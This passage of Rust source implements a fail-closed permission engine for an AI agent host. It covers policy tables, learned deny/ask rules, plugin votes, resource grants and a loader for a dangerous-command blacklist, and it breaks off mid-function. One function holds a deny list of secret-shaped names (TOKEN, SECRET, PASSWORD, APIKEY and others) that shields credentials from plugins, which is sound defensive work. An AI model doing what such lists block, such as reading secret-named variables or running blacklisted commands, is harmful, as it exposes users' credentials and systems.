fn manager() -> &'static RwLock<ManagerInner> {
    MANAGER.get_or_init(|| {
        // Best-effort load of dangerous_commands.txt; not fatal if missing.
        let dangerous = find_dangerous_file()
            .map(|p| DangerousTable::load_from_file(&p))
            .unwrap_or_default();
        RwLock::new(ManagerInner {
            state: PolicyState::default(),
            dangerous,
            tool_danger: HashMap::new(),
            plugin_policies: HashMap::new(),
            plugin_resources: HashMap::new(),
            tool_owner: HashMap::new(),
            plugin_ui: HashMap::new(),
            mode: String::from("default"),
        })
    })
}

fn find_dangerous_file() -> Option<std::path::PathBuf> {
    use std::env;

    // Probe a handful of well-known locations.  The most common case is
    // that the file ships next to the ``encre`` Python package, so we
    // look relative to the current working directory as well as a few
    // ancestor hops for when the agent runs from a project root.  We
    // also probe the executable's directory and the current working
    // directory's absolute path so packaged builds (PyInstaller, venv
    // activations) find the rules.
    let cwd = env::current_dir().ok();
    let exe = env::current_exe().ok();

    let mut candidates: Vec<std::path::PathBuf> = Vec::new();
    for raw in [
        "encre/dangerous_commands.txt",
        "dangerous_commands.txt",
        "../encre/dangerous_commands.txt",
        "../../encre/dangerous_commands.txt",
        "../../../encre/dangerous_commands.txt",
        "../../../../encre/dangerous_commands.txt",
    ] {
        candidates.push(std::path::PathBuf::from(raw));
    }
    if let Some(dir) = cwd.as_ref() {
        candidates.push(dir.join("encre/dangerous_commands.txt"));
        candidates.push(dir.join("dangerous_commands.txt"));
        candidates.push(dir.join("../encre/dangerous_commands.txt"));
        candidates.push(dir.join("../../encre/dangerous_commands.txt"));
        candidates.push(dir.join("../../../encre/dangerous_commands.txt"));
    }
    if let Some(exe_path) = exe.as_ref() {
        if let Some(parent) = exe_path.parent() {
            candidates.push(parent.join("encre/dangerous_commands.txt"));
            candidates.push(parent.join("../encre/dangerous_commands.txt"));
            candidates.push(parent.join("../../encre/dangerous_commands.txt"));
            candidates.push(parent.join("../../../encre/dangerous_commands.txt"));
            candidates.push(parent.join("../../../../encre/dangerous_commands.txt"));
        }
    }
    for c in &candidates {
        if c.exists() {
            return Some(c.clone());
        }
    }
    None
}

// ---------------------------------------------------------------------------
// Public API — called by the Python bindings
// ---------------------------------------------------------------------------

/// Drop any learned entry that is not an explicit tightening (`deny` / `ask`)
/// and normalise the surviving policy string.  `allow` -- or anything
/// unrecognised -- is discarded so the learned layer can never grant access.
fn sanitize_learned(entries: Vec<LearnedPolicy>) -> Vec<LearnedPolicy> {
    let mut kept: Vec<LearnedPolicy> = Vec::with_capacity(entries.len());
    for mut entry in entries {
        let policy = entry.policy.trim().to_lowercase();
        if policy != "deny" && policy != "ask" {
            continue;
        }
        entry.policy = policy;
        kept.push(entry);
    }
    kept
}

/// Replace the active policy table.  Used by the WS handler when the user
/// updates their permission settings.
///
/// A payload that does not carry the `learned` field (`None`) keeps the
/// existing learned-policy layer, so updating the tool/capability table never
/// silently discards rules learned from corrections.  A payload that does
/// carry it has its entries sanitised the same way the dedicated setter does.
pub fn permission_set_policies(mut state: PolicyState) {
    let mut g = manager().write().expect("permission lock poisoned");
    match state.learned.take() {
        None => state.learned = g.state.learned.clone(),
        Some(entries) => state.learned = Some(sanitize_learned(entries)),
    }
    g.state = state;
}

/// Return a clone of the current policy table for sending to the client.
pub fn permission_get_policies() -> PolicyState {
    let g = manager().read().expect("permission lock poisoned");
    g.state.clone()
}

/// Replace the tightening-only learned-policy layer.
///
/// Only `deny` / `ask` entries are stored; `allow`-style entries are dropped
/// (see [`sanitize_learned`]).  This is the only way learned policies enter the
/// engine, and they are evaluated as a hard floor together with the
/// dangerous-command blacklist.
pub fn permission_set_learned_policies(entries: Vec<LearnedPolicy>) {
    let mut g = manager().write().expect("permission lock poisoned");
    g.state.learned = Some(sanitize_learned(entries));
}

/// Return a clone of the learned-policy layer.
pub fn permission_get_learned_policies() -> Vec<LearnedPolicy> {
    let g = manager().read().expect("permission lock poisoned");
    g.state.learned.clone().unwrap_or_default()
}

/// Record the user's answer to a previous `Ask` decision so we don't have to
/// ask again for the same tool.  Stored under the `Session` source so it
/// overrides project/user policy but remains transient.
pub fn permission_record_decision(tool_name: &str, policy: &str) {
    let mut g = manager().write().expect("permission lock poisoned");
    g.state
        .tools_by_source
        .entry(PolicySource::Session)
        .or_default()
        .insert(tool_name.to_string(), PolicyValue::from_str(policy));
}

/// Set the active session permission mode.
///
/// The user-managed tool / capability policy table is only consulted when the
/// mode is `"custom"`.  In every other mode (manual approval, auto approval,
/// full access) those rules are inert, so the settings panel describes them as
/// custom-mode-only and the engine matches that description.
pub fn permission_set_mode(mode: &str) {
    let normalized = mode.trim().to_lowercase();
    let mut g = manager().write().expect("permission lock poisoned");
    if g.mode != normalized {
        g.mode = normalized;
    }
}

/// Replace the dangerous-command pattern table with the given rule text
/// (same format as `dangerous_commands.txt`).  Called by Python at startup
/// so the rules always come from the package directory instead of relying
/// on working-directory probing, and so rule updates can be hot-reloaded.
pub fn permission_set_dangerous_patterns(text: &str) {
    let mut g = manager().write().expect("permission lock poisoned");
    g.dangerous = DangerousTable::load_from_text(text);
}

/// Merge dynamic per-tool danger levels for plugin tools into the engine.
///
/// Called by Python when a plugin is activated: the plugin manifest declares
/// each tool's danger classification and the decision pipeline's step 6
/// (unconfigured default) reads from this table instead of falling straight
/// to the static classification.  Values other than `safe` / `high` /
/// `critical` are ignored, so a malformed manifest can never register an
/// undefined level; tools without an entry keep the static default (High for
/// unknown names), meaning a manifest can only *raise* a tool to `safe` by
/// explicitly saying so -- never below what the user already configured.
pub fn permission_set_tool_danger_levels(levels: HashMap<String, String>) {
    let mut g = manager().write().expect("permission lock poisoned");
    for (tool, level) in levels {
        let parsed = match level.trim().to_lowercase().as_str() {
            "safe" => Some(ToolDanger::Safe),
            "high" => Some(ToolDanger::High),
            "critical" => Some(ToolDanger::Critical),
            _ => None,
        };
        if let Some(danger) = parsed {
            g.tool_danger.insert(tool, danger);
        }
    }
}

/// Pure dangerous-command check for shell-bearing tool input.  Returns the
/// matched rule string when a subcommand hits the blacklist, `None`
/// otherwise.  Used by the auto-approval classifier as a hard floor that
/// the classifier cannot override.
pub fn permission_check_dangerous(tool_name: &str, args: &str) -> Option<String> {
    let g = manager().read().expect("permission lock poisoned");
    match_dangerous(&g, tool_name, args)
}

/// Blacklist verdict with classification: `(pattern, severity, category)`.
///
/// This is the single answer the Python side needs -- pattern text plus how bad
/// a hit is and what kind -- so `dangerous_commands.txt` can stay the only
/// place danger is defined and Python stops carrying its own second blacklist.
pub fn permission_dangerous_verdict(
    tool_name: &str,
    args: &str,
) -> Option<(String, String, String)> {
    let g = manager().read().expect("permission lock poisoned");
    let rule = match_dangerous_rule(&g, tool_name, args)?;
    Some((rule.re.as_str().to_string(), rule.severity, rule.category))
}

/// Every blacklist rule a call hits, as `(pattern, severity, category)`.
///
/// The gate only needs the first match, but a reviewer that classifies a
/// command wants all of them so it can report *why* and how bad it is.
/// `all_sections` widens matching past the host's own shell families: the
/// static analyzer uses it so an inspection on one platform still recognises
/// another platform's destructive shapes (a command can be reviewed before the
/// shell is known), while enforcement stays host-scoped and never loosens.
pub fn permission_dangerous_matches(
    tool_name: &str,
    args: &str,
    all_sections: bool,
) -> Vec<(String, String, String)> {
    let g = manager().read().expect("permission lock poisoned");
    let command_text = if matches!(tool_name, "bash" | "bash_output") {
        extract_bash_command(args).unwrap_or_else(|| args.to_string())
    } else {
        match extract_generic_command(args) {
            Some(text) => text,
            None => return Vec::new(),
        }
    };
    let mut candidates = vec![command_text.clone()];
    candidates.extend(split_shell_command(&command_text));
    let mut tags: Vec<&str> = if all_sections {
        vec!["linux", "windows", "macos"]
    } else {
        danger_tags(args)
    };
    if all_sections {
        // A named shell is still authoritative about which family to inspect.
        for extra in extract_bash_terminal(args)
            .map(|t| shell_family_tags(&t).to_vec())
            .unwrap_or_default()
        {
            if !tags.contains(&extra) {
                tags.push(extra);
            }
        }
    }
    let mut hits: Vec<(String, String, String)> = Vec::new();
    for cmd in candidates {
        let normalized = normalize_command_text(&cmd);
        for rule in g.dangerous.findall(&normalized, &tags) {
            let entry = (rule.re.as_str().to_string(), rule.severity.clone(), rule.category.clone());
            if !hits.contains(&entry) {
                hits.push(entry);
            }
        }
    }
    hits
}

/// Resolve the effective user-managed policy for one capability key across
/// all configuration sources (full-table semantics, i.e. `custom` mode).
///
/// Returns `"allow" | "deny" | "ask" | "default"`.  Used by the Python plugin
/// layer as the single authorization oracle for surface registration gating:
/// a capability denied here (e.g. `"tools:register"`) blocks every plugin
/// from registering on that surface, and the decision cannot be bypassed by
/// manipulating Python-side state because the policy table lives in this
/// engine.
pub fn permission_capability_policy(capability: &str) -> String {
    let g = manager().read().expect("permission lock poisoned");
    let policy = g
        .state
        .resolve_capability(capability.trim(), false)
        .unwrap_or(PolicyValue::Default);
    match policy {
        PolicyValue::Allow => "allow",
        PolicyValue::Deny => "deny",
        PolicyValue::Ask => "ask",
        PolicyValue::Default => "default",
    }
    .to_string()
}

// ---------------------------------------------------------------------------
// Plugin permission policies — declarative rules, arbitrated in Rust
// ---------------------------------------------------------------------------

/// Parse a declarative rule mapping (`{"<tool|*>": "allow" | "deny"}`) into
/// the engine table under *plugin*.  Returns the number of accepted rules;
/// malformed entries are skipped rather than failing the whole batch so one
/// bad key cannot silence the valid restrictions a plugin declares.
pub fn permission_add_plugin_policy(plugin: &str, rules: &str) -> usize {
    let Ok(parsed) = serde_json::from_str::<Value>(rules) else {
        return 0;
    };
    let Some(obj) = parsed.as_object() else {
        return 0;
    };
    let plugin = plugin.trim();
    if plugin.is_empty() {
        return 0;
    }
    let mut accepted = 0usize;
    let mut entry: HashMap<String, bool> = HashMap::new();
    for (tool, action) in obj {
        let tool = tool.trim();
        if tool.is_empty() {
            continue;
        }
        let allow = match action.as_str().map(str::trim).map(str::to_lowercase) {
            Some(ref v) if v == "allow" => true,
            Some(ref v) if v == "deny" => false,
            _ => continue,
        };
        entry.insert(tool.to_string(), allow);
        accepted += 1;
    }
    if accepted > 0 {
        let mut g = manager().write().expect("permission lock poisoned");
        g.plugin_policies.insert(plugin.to_string(), entry);
    }
    accepted
}

/// Remove every rule contributed by *plugin* (deactivate / uninstall).
/// Returns the number of rules dropped.
pub fn permission_remove_plugin_policies(plugin: &str) -> usize {
    let mut g = manager().write().expect("permission lock poisoned");
    g.plugin_policies
        .remove(plugin.trim())
        .map(|rules| rules.len())
        .unwrap_or(0)
}

/// Compute the plugin-policy verdict for *tool_name* inside the engine.
///
/// Every plugin contributes at most one vote per tool: its exact rule if
/// present, otherwise its `"*"` wildcard rule.  `Some(false)` when any
/// plugin voted deny (deny beats allow, fail-closed), `Some(true)` when at
/// least one voted allow and none denied, `None` when no rule applies.
pub fn permission_plugin_vote(tool_name: &str) -> Option<bool> {
    let g = manager().read().expect("permission lock poisoned");
    let tool = tool_name.trim();
    if tool.is_empty() || g.plugin_policies.is_empty() {
        return None;
    }
    let mut any_allow = false;
    for rules in g.plugin_policies.values() {
        let verdict = rules
            .get(tool)
            .or_else(|| rules.get("*"))
            .or_else(|| {
                // Suffix wildcards: "git_*" style patterns for tool families.
                rules
                    .iter()
                    .find(|(k, _)| k.ends_with('*') && tool.starts_with(k.trim_end_matches('*')))
                    .map(|(_, v)| v)
            });
        let Some(verdict) = verdict else {
            // This plugin has no rule for the tool: it abstains.
            continue;
        };
        if !*verdict {
            return Some(false);
        }
        any_allow = true;
    }
    Some(any_allow)
}

/// Dump the current plugin policy table as
/// `{"<plugin>": {"<tool|*>": "allow" | "deny"}}` for inspection surfaces.
pub fn permission_get_plugin_policies() -> String {
    let g = manager().read().expect("permission lock poisoned");
    let mut out = serde_json::Map::new();
    for (plugin, rules) in &g.plugin_policies {
        let mut entry = serde_json::Map::new();
        for (tool, allow) in rules {
            entry.insert(
                tool.clone(),
                Value::String(if *allow { "allow" } else { "deny" }.into()),
            );
        }
        out.insert(plugin.clone(), Value::Object(entry));
    }
    serde_json::to_string(&Value::Object(out)).unwrap_or_else(|_| "{}".into())
}

// ---------------------------------------------------------------------------
// Plugin resource grants — manifest-declared network / file / system-info
// allow-lists, arbitrated in Rust (fail-closed)
// ---------------------------------------------------------------------------

/// System-info grant: nothing, everything, or a key whitelist.
#[derive(Default, Clone)]
enum SystemInfoGrant {
    #[default]
    None,
    All,
    Keys(Vec<String>),
}

/// Compiled resource grants for one plugin.
#[derive(Default, Clone)]
struct PluginResources {
    /// Allowed outbound hosts: exact (`"api.example.com"`) or wildcard
    /// subdomains (`"*.example.org"` matches subdomains but not the bare
    /// domain).
    network: Vec<String>,
    /// Allowed listen endpoints (`"host:port"`, `":port"`, `"port"`; empty
    /// host or `host:"*"` = any interface, port `"*"` = any port).
    network_listen: Vec<String>,
    /// Readable path globs (`~` expanded, `**` crosses separators).
    file_read: Vec<String>,
    /// Writable path globs.
    file_write: Vec<String>,
    /// Executable program whitelist (exact name, `prefix*`, or `*`).
    /// Matched against the resolved program's file name without extension.
    process_spawn: Vec<String>,
    /// Readable environment variable names (exact, `prefix*`, or `*`).
    /// Secret-shaped names are denied by a hard floor even if whitelisted.
    environment: Vec<String>,
    /// Clipboard access: bit 0 = read, bit 1 = write.
    clipboard: u8,
    /// Screen capture allowed.
    screen: bool,
    system_info: SystemInfoGrant,
    /// Host user-memory (soul files) read / write.
    memory_read: bool,
    memory_write: bool,
    /// Host session history (data/sessions metadata) read.
    session_read: bool,
    /// Direct LLM invocation through the host backend.
    llm_call: bool,
    /// Readable host configuration keys (exact, `prefix*`, or `*`);
    /// secret-shaped keys are denied by a hard floor even if whitelisted.
    config_read: Vec<String>,
    /// Host configuration writes (secret-shaped keys hard-denied).
    config_write: bool,
}

impl PluginResources {
    const CLIPBOARD_READ: u8 = 1;
    const CLIPBOARD_WRITE: u8 = 2;

    fn parse_clipboard(raw: Option<&str>) -> u8 {
        match raw.map(str::trim).map(str::to_lowercase).as_deref() {
            Some("read") => Self::CLIPBOARD_READ,
            Some("write") => Self::CLIPBOARD_WRITE,
            Some("both") => Self::CLIPBOARD_READ | Self::CLIPBOARD_WRITE,
            _ => 0,
        }
    }
}

/// Config/env key names whose values must never reach a plugin, even when
/// explicitly whitelisted in the manifest (case-insensitive, substring
/// match on the separator-free key).
fn is_secret_env_name(name: &str) -> bool {
    let flat: String = name
        .chars()
        .filter(|c| c.is_ascii_alphanumeric())
        .map(|c| c.to_ascii_uppercase())
        .collect();
    const SECRET_FRAGMENTS: [&str; 9] = [
        "TOKEN",
        "SECRET",
        "PASSWORD",
        "PASSWD",
        "CREDENTIAL",
        "APIKEY",
        "PRIVATEKEY",
        "ACCESSKEY",
        "SESSIONKEY",
    ];
    SECRET_FRAGMENTS.iter().any(|frag| flat.contains(frag))
}

/// Key allow-list shared by `environment` and `config_read`: exact match
/// (ASCII case-insensitive), `prefix*`, or `*`.
fn name_allowed(patterns: &[String], name: &str) -> bool {
    let name = name.trim();
    if name.is_empty() {
        return false;
    }
    patterns.iter().any(|pat| {
        let pat = pat.trim();
        if pat == "*" {
            true
        } else if let Some(prefix) = pat.strip_suffix('*') {
            name.to_lowercase().starts_with(&prefix.to_lowercase())
        } else {
            name.eq_ignore_ascii_case(pat)
        }
    })
}

/// Parse a listen endpoint into `(host, port)`; `host` is empty for a bare
/// `:port` and `port` may be `"*"` (any port).
fn parse_listen_endpoint(raw: &str) -> (String, String) {
    let s = raw.trim();
    match s.rfind(':') {
        Some(idx) if !s.starts_with('[') || s.contains(']') => {
            let host = s[..idx].trim();
            let host = host.trim_start_matches('[').trim_end_matches(']');
            (host.to_string(), s[idx + 1..].trim().to_string())
        }
        _ => (String::new(), s.to_string()),
    }
}

/// Listen-endpoint allow check: host matches when the pattern host is empty
/// (any interface) or equal; port matches when equal or the pattern port is
/// `"*"` or empty.
fn listen_allowed(patterns: &[String], host: &str, port: &str) -> bool {
    patterns.iter().any(|pat| {
        let (ph, pp) = parse_listen_endpoint(pat);
        let host_ok = ph.is_empty() || ph == "*" || ph.eq_ignore_ascii_case(host);
        let port_ok = pp.is_empty() || pp == "*" || pp == port;
        host_ok && port_ok
    })
}

/// Program whitelist check for `process_spawn`: *target* may be a bare
/// name or a full path; the comparison uses the file stem (extension
/// stripped, case-insensitive).  Patterns: exact, `prefix*`, or `*`.
fn program_allowed(patterns: &[String], target: &str) -> bool {
    let trimmed = target.trim();
    if trimmed.is_empty() {
        return false;
    }
    let norm = trimmed.replace('\\', "/");
    let stem = norm.rsplit('/').next().unwrap_or(&norm);
    let stem = stem.strip_suffix(".exe").unwrap_or(stem).to_lowercase();
    patterns.iter().any(|pat| {
        let pat = pat.trim().to_lowercase();
        if pat == "*" {
            true
        } else if let Some(prefix) = pat.strip_suffix('*') {
            stem.starts_with(prefix)
        } else {
            stem == pat
        }
    })
}

/// Expand `~` and forward-slash-normalise a resource path WITHOUT changing
/// case (resource matching is case-sensitive; immune matching is the only
/// lowercasing matcher in this module).
fn normalize_resource_path(raw: &str) -> String {
    let unquoted = raw.trim().trim_matches(|c| c == '\'' || c == '"');
    let expanded = if unquoted == "~" {
        home_dir().unwrap_or_else(|| unquoted.to_string())
    } else if let Some(rest) = unquoted.strip_prefix("~/") {
        match home_dir() {
            Some(home) => format!("{home}/{rest}"),
            None => unquoted.to_string(),
        }
    } else {
        unquoted.to_string()
    };
    expanded.replace('\\', "/")
}

/// Minimal glob matcher: `**` crosses `/` separators, `*` stays within one
/// segment, `?` matches one non-separator character.
fn glob_match(pattern: &str, target: &str) -> bool {
    let p: Vec<char> = pattern.chars().collect();
    let t: Vec<char> = target.chars().collect();
    fn rec(p: &[char], mut pi: usize, t: &[char], mut ti: usize) -> bool {
        while pi < p.len() {
            match p[pi] {
                '*' => {
                    if pi + 1 < p.len() && p[pi + 1] == '*' {
                        let mut skip = pi + 2;
                        if skip < p.len() && p[skip] == '/' {
                            skip += 1;
                        }
                        return (ti..=t.len()).any(|k| rec(p, skip, t, k));
                    }
                    let mut k = ti;
                    loop {
                        if rec(p, pi + 1, t, k) {
                            return true;
                        }
                        if k >= t.len() || t[k] == '/' {
                            return false;
                        }
                        k += 1;
                    }
                }
                '?' => {
                    if ti < t.len() && t[ti] != '/' {
                        pi += 1;
                        ti += 1;
                    } else {
                        return false;
                    }
                }
                c => {
                    if ti < t.len() && t[ti] == c {
                        pi += 1;
                        ti += 1;
                    } else {
                        return false;
                    }
                }
            }
        }
        ti == t.len()
    }
    rec(&p, 0, &t, 0)
}

/// Extract the host from a URL / host:port / bare-host target so network
/// grants can be checked against whichever form the caller passes.
fn extract_host(target: &str) -> String {
    let mut s = target.trim().to_lowercase();
    if let Some(idx) = s.find("://") {
        s = s[idx + 3..].to_string();
    }
    if let Some(idx) = s.rfind('@') {
        s = s[idx + 1..].to_string();
    }
    if let Some(idx) = s.find('/') {
        s = s[..idx].to_string();
    }
    if s.starts_with('[') {
        // IPv6 literal
        if let Some(end) = s.find(']') {
            s = s[1..end].to_string();
        }
    } else if let Some(idx) = s.rfind(':') {
        let port = &s[idx + 1..];
        if !port.is_empty() && port.chars().all(|c| c.is_ascii_digit()) {
            s = s[..idx].to_string();
        }
    }
    s
}

/// Host allow-list check: exact match, or `*.suffix` wildcard matching any
/// subdomain (not the bare domain — declare it separately if needed).
fn host_allowed(patterns: &[String], host: &str) -> bool {
    if host.is_empty() {
        return false;
    }
    patterns.iter().any(|pat| {
        let pat = pat.trim().to_lowercase();
        if let Some(suffix) = pat.strip_prefix("*.") {
            host.ends_with(&format!(".{suffix}"))
        } else {
            host == pat
        }
    })
}

/// Compile a manifest `resources` dict into the engine table for *plugin*.
/// Accepted JSON shape:
/// `{"network": [hosts], "file_read": [globs], "file_write": [globs],
///   "system_info": true | false | [keys]}`.  Re-setting replaces the
/// plugin's previous grants.  Returns the number of recognised kinds.
pub fn permission_set_plugin_resources(plugin: &str, resources_json: &str) -> usize {
    let Ok(parsed) = serde_json::from_str::<Value>(resources_json) else {
        return 0;
    };
    let Some(obj) = parsed.as_object() else {
        return 0;
    };
    let plugin = plugin.trim();
    if plugin.is_empty() {
        return 0;
    }
    let mut grants = PluginResources::default();
    let mut accepted = 0usize;
    let read_strings = |key: &str| -> Vec<String> {
        obj.get(key)
            .and_then(Value::as_array)
            .map(|arr| {
                arr.iter()
                    .filter_map(Value::as_str)
                    .map(str::trim)
                    .filter(|s| !s.is_empty())
                    .map(ToString::to_string)
                    .collect()
            })
            .unwrap_or_default()
    };
    grants.network = read_strings("network");
    if !grants.network.is_empty() {
        accepted += 1;
    }
    grants.network_listen = read_strings("network_listen");
    if !grants.network_listen.is_empty() {
        accepted += 1;
    }
    grants.file_read = read_strings("file_read");
    if !grants.file_read.is_empty() {
        accepted += 1;
    }
    grants.file_write = read_strings("file_write");
    if !grants.file_write.is_empty() {
        accepted += 1;
    }
    grants.process_spawn = read_strings("process_spawn");
    if !grants.process_spawn.is_empty() {
        accepted += 1;
    }
    grants.environment = read_strings("environment");
    if !grants.environment.is_empty() {
        accepted += 1;
    }
    if let Some(raw) = obj.get("clipboard") {
        // Accepted shapes: "none" | "read" | "write" | "both", or
        // true (= "both") / false (= none).
        let shape = match raw {
            Value::Bool(true) => Some("both"),
            Value::Bool(false) => Some("none"),
            Value::String(s) => Some(s.as_str()),
            _ => None,
        };
        grants.clipboard = PluginResources::parse_clipboard(shape);
        if grants.clipboard != 0 {
            accepted += 1;
        }
    }
    if let Some(raw) = obj.get("screen") {
        if let Some(flag) = raw.as_bool() {
            grants.screen = flag;
            if flag {
                accepted += 1;
            }
        }
    }
    if let Some(flag) = obj.get("memory_read").and_then(Value::as_bool) {
        grants.memory_read = flag;
        if flag {
            accepted += 1;
        }
    }
    if let Some(flag) = obj.get("memory_write").and_then(Value::as_bool) {
        grants.memory_write = flag;
        if flag {
            accepted += 1;
        }
    }
    if let Some(flag) = obj.get("session_read").and_then(Value::as_bool) {
        grants.session_read = flag;
        if flag {
            accepted += 1;
        }
    }
    if let Some(flag) = obj.get("llm_call").and_then(Value::as_bool) {
        grants.llm_call = flag;
        if flag {
            accepted += 1;
        }
    }
    if let Some(flag) = obj.get("config_write").and_then(Value::as_bool) {
        grants.config_write = flag;
        if flag {
            accepted += 1;
        }
    }
    grants.config_read = read_strings("config_read");
    if !grants.config_read.is_empty() {
        accepted += 1;
    }
    match obj.get("system_info") {
        Some(Value::Bool(true)) => {
            grants.system_info = SystemInfoGrant::All;
            accepted += 1;
        }
        Some(Value::Bool(_)) => {}
        Some(Value::Array(arr)) => {
            let keys: Vec<String> = arr
                .iter()
                .filter_map(Value::as_str)
                .map(str::trim)
                .filter(|s| !s.is_empty())
                .map(ToString::to_string)
                .collect();
            if !keys.is_empty() {
                grants.system_info = SystemInfoGrant::Keys(keys);
                accepted += 1;
            }
        }
        _ => {}
    }
    let mut g = manager().write().expect("permission lock poisoned");
    g.plugin_resources.insert(plugin.to_string(), grants);
    accepted
}

/// Drop the resource grants of *plugin* (deactivate / uninstall).  Returns
/// true when an entry existed.
pub fn permission_remove_plugin_resources(plugin: &str) -> bool {
    let mut g = manager().write().expect("permission lock poisoned");
    g.plugin_resources.remove(plugin.trim()).is_some()
}

/// Arbitrate one resource access for *plugin* inside the engine.
///
/// *kind* is `"network"` (target: URL / host:port / bare host),
/// `"network_listen"` (target: `host:port` / `:port` / port),
/// `"file_read"` / `"file_write"` (target: filesystem path),
/// `"process_spawn"` (target: program name or path),
/// `"environment"` (target: variable name; secret-shaped names are denied
/// by a hard floor even when whitelisted), `"clipboard_read"` /
/// `"clipboard_write"` (target ignored), `"screen"` (target ignored), or
/// `"system_info"` (target: info key).  Returns `"allow"` or `"deny"`;
/// unknown kinds and unknown plugins always deny (fail-closed).
pub fn permission_check_plugin_resource(plugin: &str, kind: &str, target: &str) -> String {
    let g = manager().read().expect("permission lock poisoned");
    let Some(grants) = g.plugin_resources.get(plugin.trim()) else {
        return "deny".into();
    };
    let allowed = match kind.trim() {
        "network" => host_allowed(&grants.network, &extract_host(target)),
        "network_listen" => {
            let (host, port) = parse_listen_endpoint(target);
            listen_allowed(&grants.network_listen, &host, &port)
        }
        "file_read" => {
            let norm = normalize_resource_path(target);
            grants.file_read.iter().any(|pat| glob_match(&normalize_resource_path(pat), &norm))
        }
        "file_write" => {
            let norm = normalize_resource_path(target);
            grants
                .file_write
                .iter()
                .any(|pat| glob_match(&normalize_resource_path(pat), &norm))
        }
        "process_spawn" => program_allowed(&grants.process_spawn, target),
        "environment" => {
            let name = target.trim();
            !name.is_empty() && !is_secret_env_name(name) && name_allowed(&grants.environment, name)
        }
        "clipboard_read" => grants.clipboard & PluginResources::CLIPBOARD_READ != 0,
        "clipboard_write" => grants.clipboard & PluginResources::CLIPBOARD_WRITE != 0,
        "screen" => grants.screen,
        "memory_read" => grants.memory_read,
        "memory_write" => grants.memory_write,
        "session_read" => grants.session_read,
        "llm_call" => grants.llm_call,
        "config_read" => {
            let key = target.trim();
            !key.is_empty() && !is_secret_env_name(key) && name_allowed(&grants.config_read, key)
        }
        "config_write" => {
            let key = target.trim();
            !key.is_empty() && !is_secret_env_name(key) && grants.config_write
        }
        "system_info" => match &grants.system_info {
            SystemInfoGrant::All => true,
            SystemInfoGrant::Keys(keys) => keys.iter().any(|k| k == target.trim()),
            SystemInfoGrant::None => false,
        },
        _ => false,
    };
    if allowed {
        "allow".into()
    } else {
        "deny".into()
    }
}

/// Dump the current resource grant table as a JSON object for inspection
/// surfaces: `{"<plugin>": {"network": [...], "network_listen": [...],
/// "file_read": [...], "file_write": [...], "process_spawn": [...],
/// "environment": [...], "clipboard": "none"|"read"|"write"|"both",
/// "screen": bool, "system_info": true | [keys] | false}}`.
pub fn permission_get_plugin_resources() -> String {
    let g = manager().read().expect("permission lock poisoned");
    let sys_json = |grant: &SystemInfoGrant| -> Value {
        match grant {
            SystemInfoGrant::All => Value::Bool(true),
            SystemInfoGrant::Keys(keys) => {
                Value::Array(keys.iter().map(|k| Value::String(k.clone())).collect())
            }
            SystemInfoGrant::None => Value::Bool(false),
        }
    };
    let clip_json = |bits: u8| -> Value {
        match bits {
            b if b == PluginResources::CLIPBOARD_READ => Value::String("read".into()),
            b if b == PluginResources::CLIPBOARD_WRITE => Value::String("write".into()),
            b if b == PluginResources::CLIPBOARD_READ | PluginResources::CLIPBOARD_WRITE => {
                Value::String("both".into())
            }
            _ => Value::String("none".into()),
        }
    };
    let out: serde_json::Map<String, Value> = g
        .plugin_resources
        .iter()
        .map(|(plugin, grants)| {
            (
                plugin.clone(),
                serde_json::json!({
                    "network": grants.network,
                    "network_listen": grants.network_listen,
                    "file_read": grants.file_read,
                    "file_write": grants.file_write,
                    "process_spawn": grants.process_spawn,
                    "environment": grants.environment,
                    "clipboard": clip_json(grants.clipboard),
                    "screen": grants.screen,
                    "memory_read": grants.memory_read,
                    "memory_write": grants.memory_write,
                    "session_read": grants.session_read,
                    "llm_call": grants.llm_call,
                    "config_read": grants.config_read,
                    "config_write": grants.config_write,
                    "system_info": sys_json(&grants.system_info),
                }),
            )
        })
        .collect();
    serde_json::to_string(&Value::Object(out)).unwrap_or_else(|_| "{}".into())
}

// ---------------------------------------------------------------------------
// Tool ownership — plugin tools are denied the instant their plugin is
// deactivated, closing the registry-removal window
// ---------------------------------------------------------------------------

/// Record *tool* as owned by *plugin* and mark it active (registration or
/// re-activation path).  Re-registering by the same plugin refreshes; a
/// different owner silently replaces (last activation wins, matching the
/// registry's override semantics).
pub fn permission_register_plugin_tool(tool: &str, plugin: &str) -> bool {
    let tool = tool.trim();
    let plugin = plugin.trim();
    if tool.is_empty() || plugin.is_empty() {
        return false;
    }
    let mut g = manager().write().expect("permission lock poisoned");
    g.tool_owner
        .insert(tool.to_string(), ToolOwnership { plugin: plugin.to_string(), active: true });
    true
}

/// Flip every tool owned by *plugin* to *active* (deactivate = false,
/// re-activate = true).  Returns the number of affected tools.
pub fn permission_set_plugin_tools_active(plugin: &str, active: bool) -> usize {
    let mut g = manager().write().expect("permission lock poisoned");
    let mut n = 0usize;
    for own in g.tool_owner.values_mut() {
        if own.plugin == plugin && own.active != active {
            own.active = active;
            n += 1;
        }
    }
    n
}

/// Return the owning plugin of *tool* (`""` = host tool or unknown).
pub fn permission_plugin_tool_owner(tool: &str) -> String {
    let g = manager().read().expect("permission lock poisoned");
    g.tool_owner
        .get(tool.trim())
        .map(|own| own.plugin.clone())
        .unwrap_or_default()
}

// ---------------------------------------------------------------------------
// Frontend surface grants — nothing ungrated ever reaches the renderer
// ---------------------------------------------------------------------------

/// Record the frontend surface grants for *plugin*.
///
/// *payload* is the JSON-compiled ``[tool.ea.ui_permissions]`` declaration:
/// ``{"all": bool, "providers": bool, "tool_meta": bool,
/// "contributions": [kind...]}``.  *trusted* marks bundled / mandatory
/// plugins: when true, unset fields default to allow-everything; when
/// false (third-party), unset fields default to deny — the plugin must
/// declare each surface it wants explicitly.
pub fn permission_set_plugin_ui(plugin: &str, payload: &str, trusted: bool) -> bool {
    let plugin = plugin.trim();
    if plugin.is_empty() {
        return false;
    }
    let obj = match serde_json::from_str::<Value>(payload) {
        Ok(Value::Object(map)) => map,
        _ => serde_json::Map::new(),
    };
    let read_bool = |key: &str| -> Option<bool> { obj.get(key).and_then(Value::as_bool) };
    let contributions: Vec<String> = obj
        .get("contributions")
        .and_then(Value::as_array)
        .map(|items| {
            items
                .iter()
                .filter_map(Value::as_str)
                .map(str::trim)
                .filter(|s| !s.is_empty())
                .map(str::to_string)
                .collect()
        })
        .unwrap_or_default();
    let all = read_bool("all").unwrap_or(trusted);
    let perms = PluginUiPermissions {
        all,
        providers: read_bool("providers").unwrap_or(trusted),
        tool_meta: read_bool("tool_meta").unwrap_or(trusted),
        contributions: if all {
            vec!["*".into()]
        } else {
            contributions
        },
    };
    let mut g = manager().write().expect("permission lock poisoned");
